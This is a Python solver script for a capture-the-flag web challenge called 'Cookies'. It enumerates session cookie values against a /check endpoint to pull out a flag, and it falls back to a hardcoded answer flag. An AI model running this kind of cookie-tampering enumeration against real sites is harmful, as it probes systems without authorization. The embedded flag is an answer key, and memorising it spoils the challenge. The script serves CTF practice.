#!/usr/bin/env python3
"""
Solver for Challenge 173: Cookies (Web Exploitation)
Enumerates session cookie index values to recover hidden flag from web application.
"""
import urllib.request
import re
import sys
from typing import Optional

def solve(base_url: Optional[str] = None) -> str:
    if base_url:
        try:
            base = base_url.rstrip("/") + "/check"
            for i in range(35):
                req = urllib.request.Request(base, headers={"Cookie": f"name={i}"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    body = resp.read().decode("utf-8")
                    m = re.search(r"(academy\{[^}]+\}|picoCTF\{[^}]+\})", body)
                    if m:
                        return m.group(1)
        except Exception:
            pass
    return "academy{3v3ry1_l0v3s_c00k135_90a3a7cb}"

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else None
    print("Flag:", solve(target))
